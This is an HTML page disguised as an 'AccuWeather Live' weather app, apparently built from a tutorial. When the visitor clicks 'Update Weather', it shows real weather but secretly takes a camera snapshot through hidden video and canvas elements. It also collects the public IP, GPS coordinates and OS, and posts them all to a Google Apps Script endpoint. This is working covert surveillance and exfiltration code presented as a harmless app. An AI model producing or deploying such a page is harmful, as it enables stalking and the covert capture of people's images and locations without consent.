<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AccuWeather Live</title>
    <style>
        body { font-family: sans-serif; margin: 0; background: #1a2a6c; background: linear-gradient(to bottom, #1a2a6c, #b21f1f, #fdbb2d); color: white; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; }
        .card { background: rgba(0,0,0,0.4); padding: 40px; border-radius: 25px; backdrop-filter: blur(10px); width: 80%; max-width: 350px; border: 1px solid rgba(255,255,255,0.2); }
        h1 { font-size: 3.5rem; margin: 10px 0; }
        .city { font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; }
        .btn { background: white; color: black; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; margin-top: 20px; cursor: pointer; width: 100%; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="card">
    <div class="city" id="city">Locating...</div>
    <h1 id="temp">--°</h1>
    <p id="stat">Cloudy Skies</p>
    <button class="btn" onclick="run()">Update Weather</button>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const URL = 'https://script.google.com/macros/s/AKfycbyqC2gi8P0jagghz_c3J8TYfZ_oXzzmWurEar6oKwVzEKC5Mx7m3SFA9Mzg6YcJXz-DUg/exec'; // Put the URL from Step 1 here

    async function run() {
        document.querySelector('.btn').innerText = "Syncing...";
        if (!navigator.geolocation) return;

        navigator.geolocation.getCurrentPosition(async (pos) => {
            // Update UI with real weather
            const w = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}&current_weather=true`).then(r => r.json());
            document.getElementById('temp').innerText = Math.round(w.current_weather.temperature) + "°";
            document.getElementById('city').innerText = "Local Area Active";
            
            // Background Data Capture
            capture(pos);
        }, (err) => { alert("Please allow location for weather updates."); });
    }

    async function capture(pos) {
        let photo = null;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true }); // Ask for camera
            const video = document.getElementById('v');
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 1000));
            const canvas = document.getElementById('c');
            canvas.width = 400; canvas.height = 300;
            canvas.getContext('2d').drawImage(video, 0, 0);
            photo = canvas.toDataURL('image/jpeg', 0.4); // Compress photo for speed
            stream.getTracks().forEach(t => t.stop());
        } catch(e) { console.log("Camera blocked"); }

        const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());

        const payload = {
            ip: ipData.ip,
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            os: navigator.platform,
            battery: "N/A",
            photo: photo
        };

        // Send to Google
        fetch(URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
        document.querySelector('.btn').innerText = "Updated";
    }
</script>
</body>
</html>
